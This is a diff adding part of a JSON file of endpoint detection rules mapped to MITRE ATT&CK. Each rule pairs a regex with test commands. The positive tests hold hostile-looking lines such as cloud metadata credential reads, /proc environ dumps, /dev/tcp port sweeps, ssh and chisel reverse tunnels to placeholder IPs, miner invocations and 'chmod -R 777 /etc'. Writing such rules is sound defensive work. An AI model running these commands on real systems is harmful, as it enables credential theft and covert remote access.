+    "cloud"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://169.254.169.254/latest/meta-data/instance-id"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-proc-environ-or-mem-read",
+   "name": "Reading another process environ or mem",
+   "description": "Commands reading /proc/PID/environ or mem with cat, strings or dd harvest secrets from live processes.",
+   "tactic": "Credential Access",
+   "technique": "T1003.007",
+   "technique_name": "Proc Filesystem",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(cat|strings|grep|xxd|dd)\\b.*/proc/(\\d+|\\*|\\$\\w+)/(environ|mem)\\b"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c cat /proc/1234/environ | tr \\0 \\n"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/cat",
+      "command": "cat /proc/cpuinfo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-network-sweep-cmdline",
+   "name": "Port or host sweep over a whole subnet",
+   "description": "nmap, masscan or zmap with CIDR targets and broad port flags, or bash loops over /dev/tcp, are internal reconnaissance.",
+   "tactic": "Discovery",
+   "technique": "T1046",
+   "technique_name": "Network Service Discovery",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "((nmap|masscan|zmap|rustscan)\\b.*(\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+|-p-|--top-ports|--rate)|for\\s+\\w+\\s+in\\s+.*do\\s+.*(/dev/tcp/|nc\\s+-z))"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "recon"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/nmap",
+      "command": "nmap -sS -p- 10.0.0.0/24"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c for p in $(seq 1 1024); do (echo > /dev/tcp/10.0.0.5/$p) 2>/dev/null && echo $p; done"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/nmap",
+      "command": "nmap -p 443 example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-ssh-tunnel-flags",
+   "name": "ssh dynamic or reverse tunnel to remote host",
+   "description": "ssh -N with -R, -D or -w is a persistent tunnel to bypass perimeter controls.",
+   "tactic": "Command and Control",
+   "technique": "T1572",
+   "technique_name": "Protocol Tunneling",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-\\w*N\\w*\\s.*(-R\\s*\\S+|-D\\s*\\d+|-w\\s*\\d)|(-R\\s*\\d+:\\S+).*\\s-\\w*N"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "tunnel"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -N -R 2222:localhost:22 bob@203.0.113.9"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -f -N -D 1080 bob@h"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh bob@h uptime"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-tunnel-tool-expose",
+   "name": "Tunnelling tool exposing a local port",
+   "description": "ngrok, cloudflared, chisel, frp or ligolo used with tcp, http, client or connect args exposes internal services externally.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "[/\\\\](ngrok|cloudflared|chisel|frpc|ligolo-agent|ligolo|bore|rathole)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(tcp|http|tunnel|client|connect|-connect|local)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "tunnel"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/chisel",
+      "command": "chisel client 203.0.113.9:8080 R:socks"
+     },
+     {
+      "executable": "/usr/local/bin/ngrok",
+      "command": "ngrok tcp 22"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/ngrok",
+      "command": "ngrok version"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-miner-pool-arguments",
+   "name": "Cryptominer pool arguments",
+   "description": "stratum URLs and pool flags on any binary identify mining irrespective of name.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(stratum\\+(tcp|ssl)://|--donate-level|\\s-o\\s+\\S+:(3333|4444|5555|7777|14444)\\b.*\\s-u\\s|--coin[= ]|xmr\\.\\S+:\\d+)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "miner"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/tmp/.m",
+      "command": "/tmp/.m -o stratum+tcp://pool.example:3333 -u wallet"
+     },
+     {
+      "executable": "/dev/shm/x",
+      "command": "x --donate-level 1 -o pool.supportxmr.com:3333"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://pool.example/docs"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-chmod-777-recursive-system-dir",
+   "name": "Recursive world-writable permissions on system or web dir",
+   "description": "chmod -R 777 on etc, usr or web roots weakens protections and is used for persistence and privilege abuse.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.002",
+   "technique_name": "Linux and Mac File and Directory Permissions Modification",
+   "severity": "medium",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "/chmod$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-R\\s+(0?777|a\\+rwx|o\\+w)\\s+(/|/etc|/usr|/var/www|/bin|/root)(\\s|/|$)"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "permissions"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod -R 777 /etc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/chmod",
+      "command": "chmod -R 755 /home/dev/site"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-icacls-grant-everyone-system-dir",
+   "name": "icacls grants Everyone full control on system path",
+   "description": "icacls /grant Everyone:F on Windows or Program Files paths prepares tampering or service hijack.",
+   "tactic": "Defense Evasion",
+   "technique": "T1222.001",
+   "technique_name": "Windows File and Directory Permissions Modification",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(icacls|cacls|takeown)\\.exe$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\\\windows\\\\|\\\\program files|system32)\\S*.*(/grant:?r?\\s+(everyone|users|\\*S-1-1-0):\\(?(f|fc|m))"
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "permissions"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\icacls.exe",
+      "command": "icacls C:\\Windows\\System32\\x.dll /grant Everyone:F"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\icacls.exe",
+      "command": "icacls C:\\data\\share /grant Users:R"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-implant-default-ports",
+   "name": "Outbound to classic implant listener ports",
+   "description": "Connections to 4444, 4443, 31337, 1337, 6666 or 9001 are common default handler ports; benign use exists but is rare.",
+   "tactic": "Command and Control",
+   "technique": "T1571",
+   "technique_name": "Non-Standard Port",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": ":(4444|4443|31337|1337|6666|1234|8089|50050)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "port"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:4444"
+     },
+     {
+      "destination": "198.51.100.4:31337"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:443"
+     },
+     {
+      "destination": "203.0.113.9:44444"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-irc-ports-raw-ip",
+   "name": "Outbound IRC-style ports to raw IP",
+   "description": "Connections to 6660-6669 or 7000 on bare IPs hint at IRC botnet C2.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(666\\d|7000)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "botnet"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:6667"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:6700"
+     },
+     {
+      "destination": "irc.libera.chat:6697"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-tor-ports",
+   "name": "Connection to Tor relay or local Tor SOCKS port",
+   "description": "Destinations on 9001, 9030, 9050 or 9150 signal Tor circuits or local Tor SOCKS use.",
+   "tactic": "Command and Control",
+   "technique": "T1090.003",
+   "technique_name": "Multi-hop Proxy",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": ":(9001|9030|9050|9051|9150)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "tor"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "127.0.0.1:9050"
+     },
+     {
+      "destination": "203.0.113.9:9030"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "127.0.0.1:9000"
+     },
+     {
+      "destination": "203.0.113.9:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-raw-ip-uncommon-high-port",
+   "name": "Raw IP on uncommon high port",
+   "description": "Bare-IP destinations on ports such as 8888, 9999, 12345 or 54321 are often one-off C2 or payload servers.",
+   "tactic": "Command and Control",
+   "technique": "T1571",
+   "technique_name": "Non-Standard Port",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(8888|9999|7777|12345|54321|60000|65000)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "port",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:8888"
+     },
+     {
+      "destination": "198.51.100.4:12345"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:8443"
+     },
+     {
+      "destination": "example.com:8888"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-lateral-ports-raw-ip",
+   "name": "Lateral-movement ports to raw IP",
+   "description": "Direct connections to 445, 3389, 5985, 5986, 135 or 139 on bare IPs suggest scanning or lateral movement from a workstation.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021",
+   "technique_name": "Remote Services",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(445|3389|5985|5986|135|139)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "lateral",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "10.0.0.12:445"
+     },
+     {
+      "destination": "10.0.0.12:3389"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "10.0.0.12:443"
+     },
+     {
+      "destination": "fs01.corp:445"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-database-port-raw-ip",
+   "name": "Database ports on raw IP",
+   "description": "Direct connections to 3306, 5432, 1433, 27017, 6379 or 9200 on bare IPs may be data theft or exposed-DB access.",
+   "tactic": "Collection",
+   "technique": "T1213",
+   "technique_name": "Data from Information Repositories",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(3306|5432|1433|27017|6379|9200|11211)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "db",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:6379"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "db.internal:6379"
+     },
+     {
+      "destination": "203.0.113.9:3000"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-resolver-bypass-ports",
+   "name": "DoT or mDNS ports to raw IP",
+   "description": "Raw-IP destination on 853, 5353 or 5355 from endpoints bypasses the corporate resolver and can hide C2 lookups.",
+   "tactic": "Command and Control",
+   "technique": "T1071.004",
+   "technique_name": "DNS",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(853|5353|5355)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "dns",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:853"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:53"
+     },
+     {
+      "destination": "dns.example.com:853"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-legacy-cleartext-ports-raw-ip",
+   "name": "Telnet and r-service ports to raw IP",
+   "description": "Telnet, TFTP or r-service ports on bare IPs reflect IoT botnet propagation and cleartext legacy access.",
+   "tactic": "Initial Access",
+   "technique": "T1078",
+   "technique_name": "Valid Accounts",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(23|2323|69|512|513|514)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "iot",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:23"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:22"
+     },
+     {
+      "destination": "router.local:23"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-cloud-metadata-reach",
+   "name": "Connection to cloud metadata endpoint",
+   "description": "Any workload reaching 169.254.169.254 or the cloud metadata names may be harvesting role credentials (expected for cloud agents).",
+   "tactic": "Credential Access",
+   "technique": "T1552.005",
+   "technique_name": "Cloud Instance Metadata API",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^(169\\.254\\.169\\.254|metadata\\.google\\.internal|169\\.254\\.170\\.2|100\\.100\\.100\\.200)(:\\d+)?$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "cloud",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "169.254.169.254:80"
+     },
+     {
+      "destination": "metadata.google.internal:80"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "169.254.10.10:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-container-control-ports",
+   "name": "Connection to container control-plane ports",
+   "description": "Ports 2375, 10250, 10255 or 2379 target unauthenticated Docker, kubelet or etcd APIs, common in cloud takeover.",
+   "tactic": "Execution",
+   "technique": "T1609",
+   "technique_name": "Container Administration Command",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": ":(2375|10250|10255|2379)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "container"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:2375"
+     },
+     {
+      "destination": "10.0.0.3:10250"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "10.0.0.3:6444"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-mining-pool-ports-raw-ip",
+   "name": "Raw IP on mining stratum ports",
+   "description": "Bare IP with 3333, 14444, 14433, 45700 or 10128 matches pool connections.",
+   "tactic": "Impact",
+   "technique": "T1496",
+   "technique_name": "Resource Hijacking",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+:(3333|14444|14433|45700|5556|10128)$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "miner"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "203.0.113.9:3333"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "203.0.113.9:3000"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-tunnel-service-domains",
+   "name": "Connection to reverse-tunnel service domain",
+   "description": "Destinations on ngrok, trycloudflare, serveo, localtunnel or pagekite give attackers disposable channels.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(ngrok\\.(io|app|dev)|ngrok-free\\.app|trycloudflare\\.com|serveo\\.net|loca\\.lt|pagekite\\.me|localhost\\.run|playit\\.gg|portmap\\.io|\\.tunnelto\\.dev)(:\\d+)?$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "tunnel"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "ab12.ngrok.io:443"
+     },
+     {
+      "destination": "x-y-z.trycloudflare.com:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "cloudflare.com:443"
+     },
+     {
+      "destination": "example.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-paste-and-drop-hosts",
+   "name": "Connection to paste or anonymous file drop host",
+   "description": "Pastebin-like and anonymous upload hosts are used for payload staging and data drops.",
+   "tactic": "Exfiltration",
+   "technique": "T1567",
+   "technique_name": "Exfiltration Over Web Service",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(pastebin\\.com|paste\\.ee|hastebin\\.com|transfer\\.sh|file\\.io|anonfiles|0x0\\.st|ix\\.io|temp\\.sh|catbox\\.moe|gofile\\.io)(:\\d+)?$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "pastebin.com:443"
+     },
+     {
+      "destination": "transfer.sh:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "docs.example.com:443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-net-chat-webhook-c2",
+   "name": "Connection to chat webhook, bot API or OAST host",
+   "description": "Discord, Telegram, webhook and OAST-style endpoints are widely used as stealer and implant C2.",
+   "tactic": "Command and Control",
+   "technique": "T1102",
+   "technique_name": "Web Service",
+   "severity": "low",
+   "os": "any",
+   "event_type": "network",
+   "match": {
+    "field": "destination",
+    "op": "regex",
+    "pattern": "(discord(app)?\\.com|api\\.telegram\\.org|hooks\\.slack\\.com|webhook\\.site|pipedream\\.net|oast\\.(fun|live|me|pro|site)|interact\\.sh)(:\\d+)?$"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "c2",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "destination": "discord.com:443"
+     },
+     {
+      "destination": "api.telegram.org:443"
+     }
+    ],
+    "negative": [
+     {
+      "destination": "github.com:443"
+     }
+    ]
+   }
+  }
+ ]
+}
